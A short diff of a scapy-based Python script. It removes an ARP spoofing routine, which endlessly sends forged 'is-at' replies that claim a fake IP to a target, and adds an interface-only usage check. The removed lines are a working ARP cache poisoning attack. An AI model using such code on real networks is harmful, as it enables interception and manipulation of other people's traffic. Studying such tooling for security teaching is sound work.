@@ -3,18 +3,7 @@
 import sys
 from scapy.all import sendp, sniff, ARP, Ether
 
-target_ip = sys. argv[1]
-fake_ip = sys.argv[2]
-iface = sys.argv[3]
+if len(sys.argv) < 2:
+    print(sys.argv[0] + " <iface >")
+    sys.exit(0)
 
-ethernet = Ether()
-
-arp = ARP(pdst=target_ip ,
-        psrc=fake_ip ,
-        op="is-at")
-
-packet = ethernet / arp
-
-while True:
-    sendp(packet , iface=iface)
-    time.sleep(1)
